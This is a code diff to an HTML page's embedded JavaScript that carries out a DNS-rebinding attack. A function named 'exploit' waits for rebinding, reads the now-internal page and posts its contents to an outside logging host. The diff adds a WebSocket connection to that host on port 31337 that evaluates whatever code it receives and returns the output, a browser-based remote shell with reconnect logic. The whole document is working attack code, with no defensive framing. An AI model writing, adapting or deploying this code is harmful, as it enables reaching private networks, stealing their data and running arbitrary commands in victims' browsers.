@@ -17,11 +17,16 @@ p{
 }
 </style>
 	<script>
-			data = "global"
+DOMAIN_NAME="mysite.xyz"
+LOGCAT="logcat."+DOMAIN_NAME
+SHELL="logcat."+DOMAIN_NAME
+data = "global"
+retry_time = 5000
+connected = 0
 function upload(data, dontEval){
 		var xhr = new XMLHttpRequest();
 		// remote logcat allows CORS
-		xhr.open("POST", "http://logcat.mysite.xyz")
+		xhr.open("POST", "http://"+LOGCAT)
 		xhr.onreadystatechange = () => {
 				if (xhr.status == 200 && xhr.readyState == XMLHttpRequest.DONE){
 						console.log("[*] Uploaded!")
@@ -33,11 +38,11 @@ function upload(data, dontEval){
 		xhr.send(data)
 }
 function navigate(url, method, data){
-				console.log("[*] Navigating to /"+url)
+				console.log("[*] Navigating to "+url)
 				if (method === undefined)
 								method = "GET"
 				var localXhr = new XMLHttpRequest();
-				localXhr.open(method, document.location.href+"/"+url);
+				localXhr.open(method, window.location.protocol+'//'+window.location.hostname+url);
 				if (method.toUpperCase() === "POST")
 								localXhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 				localXhr.onreadystatechange = () => {
@@ -47,6 +52,10 @@ function navigate(url, method, data){
 				localXhr.send(data)
 }
 function exploit(){
+				if (connected == 1){ // False positive call
+								setTimeout(exploit, retry_time)
+								return
+				}
 		flushCache()
 		var xhr = new XMLHttpRequest();
 		xhr.open("GET",document.location.href+"/attacker_uuid?"+Math.random())
@@ -60,21 +69,42 @@ function exploit(){
 						// The attaker's id file is no longer present
 						console.log("[*] Rebinding complete")
 						var localXhr = new XMLHttpRequest();
-						localXhr.open("GET",document.location.href);
+						localXhr.open("GET",window.location.href);
 						localXhr.onreadystatechange = () => {
 								if (localXhr.status == 200 && localXhr.readyState == XMLHttpRequest.DONE)
 										upload(localXhr.responseText)
 						}
 						localXhr.send()
+						let socket = new WebSocket("ws://"+SHELL+":31337")
+						socket.onclose = function(e){
+										console.log("Disconnected, lower retry time")
+										connected = 0
+										retry_time=2000
+						}
+						socket.onmessage = function(e){
+										let out = eval(e.data)
+										socket.send(out)
+						}
+						socket.onerror = function(e){
+										console.log("Server issue, tring quick retries")
+										connected = 0
+										retry_time=2000
+						}
+
+						console.log("Connected, higher the retry time")
+						connected = 1
+						retry_time = 30*60*1000
 					}
 				}
 		}
 		xhr.send()
+
+	setTimeout(exploit, retry_time)
 }
 function flushCache(){
 				var frame = document.createElement("iframe")
 				frame.style.display = "none"
-				frame.src="http://"+document.location.hostname+"/?"+parseInt(Math.random()*10000)
+				frame.src="http://"+window.location.hostname+"/?"+parseInt(Math.random()*10000)
 				frame.sandbox="allow-same-origin allow-forms"
 				var body = document.getElementsByTagName('body')[0]
 				body.appendChild(frame)
@@ -83,8 +113,13 @@ function flushCache(){
 				}.bind(frame)
 }
 
-		setInterval(exploit, 5000)
-		
+function conn_check(){
+				if (connected == 0) 
+								console.log("Disconnected for long time, lower retry time")
+								retry_time=5000
+}
+setTimeout(exploit, retry_time)
+setInterval(conn_check,30000)
 			
 	</script>
 	</head>
